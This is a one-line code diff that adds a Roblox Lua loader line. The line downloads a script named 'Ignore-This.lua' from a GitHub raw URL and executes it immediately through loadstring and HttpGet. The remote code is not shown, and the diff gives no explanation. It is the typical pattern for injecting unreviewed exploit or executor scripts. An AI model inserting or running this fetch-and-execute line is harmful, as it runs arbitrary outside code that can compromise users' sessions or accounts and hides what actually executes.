@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ATrainz/scripts/refs/heads/mainscript/Ignore-This.lua"))()
